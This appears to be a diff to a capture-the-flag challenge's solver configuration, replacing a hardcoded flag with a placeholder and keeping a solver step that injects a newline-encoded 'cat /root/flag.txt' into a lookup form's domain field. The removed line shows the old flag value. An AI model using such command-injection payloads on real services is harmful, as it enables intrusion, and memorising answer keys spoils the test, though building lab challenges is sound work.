@@ -28,10 +28,10 @@ solver:
     command: curl -s -d 'domain=example.com%0acat /root/flag.txt' http://{target.webapp}/lookup | grep -oE 'pwn3d' | head -1
     expect: pwn3d
   - name: Verify complete flag
-    command: echo 'OCR{f1lt3r_byp4ss_pwn3d}'
+    command: echo '{flag}'
     expect: OCR{
 expected_flag_count: 1
-expected_flag: OCR{f1lt3r_byp4ss_pwn3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
